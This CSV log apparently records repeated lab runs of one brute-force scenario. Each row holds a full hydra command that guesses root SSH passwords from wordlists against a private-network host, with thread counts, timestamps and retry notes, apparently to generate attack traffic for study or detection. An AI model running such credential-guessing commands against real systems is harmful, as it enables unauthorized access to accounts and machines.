scenario_id,attack_class,tool_cmd,target,start_time_utc,end_time_utc,run_note
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_small.txt -t 8 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:47:43.040621+00:00,2026-07-16T11:48:10.860210+00:00,"rep 1/15, wordlist=/tmp/wl_small.txt, threads=8"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_large.txt -t 8 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:48:15.992950+00:00,2026-07-16T11:48:16.261079+00:00,"rep 2/15, wordlist=/tmp/wl_large.txt, threads=8"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_medium.txt -t 4 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:48:21.378258+00:00,2026-07-16T11:48:21.642168+00:00,"rep 3/15, wordlist=/tmp/wl_medium.txt, threads=4"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_small.txt -t 2 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:48:26.752318+00:00,2026-07-16T11:48:27.019212+00:00,"rep 4/15, wordlist=/tmp/wl_small.txt, threads=2"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_large.txt -t 4 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:48:32.138761+00:00,2026-07-16T11:48:32.457808+00:00,"rep 5/15, wordlist=/tmp/wl_large.txt, threads=4"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_medium.txt -t 8 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:48:37.568131+00:00,2026-07-16T11:48:37.858038+00:00,"rep 6/15, wordlist=/tmp/wl_medium.txt, threads=8"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_medium.txt -t 4 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:48:42.968904+00:00,2026-07-16T11:48:43.193061+00:00,"rep 7/15, wordlist=/tmp/wl_medium.txt, threads=4"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_large.txt -t 2 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:48:48.304624+00:00,2026-07-16T11:48:48.596234+00:00,"rep 8/15, wordlist=/tmp/wl_large.txt, threads=2"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_large.txt -t 8 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:48:53.708695+00:00,2026-07-16T11:48:54.004042+00:00,"rep 9/15, wordlist=/tmp/wl_large.txt, threads=8"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_medium.txt -t 2 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:48:59.121674+00:00,2026-07-16T11:48:59.433849+00:00,"rep 10/15, wordlist=/tmp/wl_medium.txt, threads=2"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_large.txt -t 4 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:49:04.551690+00:00,2026-07-16T11:49:45.593756+00:00,"rep 11/15, wordlist=/tmp/wl_large.txt, threads=4"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_large.txt -t 2 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:49:50.720150+00:00,2026-07-16T11:49:51.005797+00:00,"rep 12/15, wordlist=/tmp/wl_large.txt, threads=2"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_large.txt -t 2 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:49:56.120796+00:00,2026-07-16T11:49:56.387905+00:00,"rep 13/15, wordlist=/tmp/wl_large.txt, threads=2"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_large.txt -t 8 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:50:01.496429+00:00,2026-07-16T11:50:40.470587+00:00,"rep 14/15, wordlist=/tmp/wl_large.txt, threads=8"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_small.txt -t 4 ssh://192.168.10.104,192.168.10.104,2026-07-16T11:50:45.590430+00:00,2026-07-16T11:50:45.875231+00:00,"rep 15/15, wordlist=/tmp/wl_small.txt, threads=4"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_medium.txt -t 4 ssh://192.168.10.104,192.168.10.104,2026-07-16T12:00:49.393478+00:00,2026-07-16T12:01:48.454824+00:00,"retry rep 2/15, wordlist=/tmp/wl_medium.txt, threads=4"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_medium.txt -t 2 ssh://192.168.10.104,192.168.10.104,2026-07-16T12:02:08.574001+00:00,2026-07-16T12:18:24.749984+00:00,"retry rep 3/15, wordlist=/tmp/wl_medium.txt, threads=2"
BRUTE-01,brute_force,hydra -l root -P /tmp/wl_medium.txt -t 4 ssh://192.168.10.104,192.168.10.104,2026-07-16T12:18:44.868237+00:00,2026-07-16T12:19:27.543859+00:00,"retry rep 4/15, wordlist=/tmp/wl_medium.txt, threads=4"
BRUTE-01,brute_force,timeout 45 hydra -l root -P /tmp/wl_medium.txt -t 8 ssh://192.168.10.104,192.168.10.104,2026-07-16T12:27:37.858918+00:00,2026-07-16T12:28:22.883872+00:00,"retry rep 2/15, wordlist=/tmp/wl_medium.txt, threads=8"
BRUTE-01,brute_force,timeout 45 hydra -l root -P /tmp/wl_small.txt -t 4 ssh://192.168.10.104,192.168.10.104,2026-07-16T12:28:38.005448+00:00,2026-07-16T12:28:48.221795+00:00,"retry rep 3/15, wordlist=/tmp/wl_small.txt, threads=4"
BRUTE-01,brute_force,timeout 45 hydra -l root -P /tmp/wl_small.txt -t 8 ssh://192.168.10.104,192.168.10.104,2026-07-16T12:29:03.344719+00:00,2026-07-16T12:29:39.827437+00:00,"retry rep 4/15, wordlist=/tmp/wl_small.txt, threads=8"
BRUTE-01,brute_force,timeout 45 hydra -l root -P /tmp/wl_medium.txt -t 8 ssh://192.168.10.104,192.168.10.104,2026-07-16T12:29:54.945597+00:00,2026-07-16T12:29:55.175772+00:00,"retry rep 5/15, wordlist=/tmp/wl_medium.txt, threads=8"
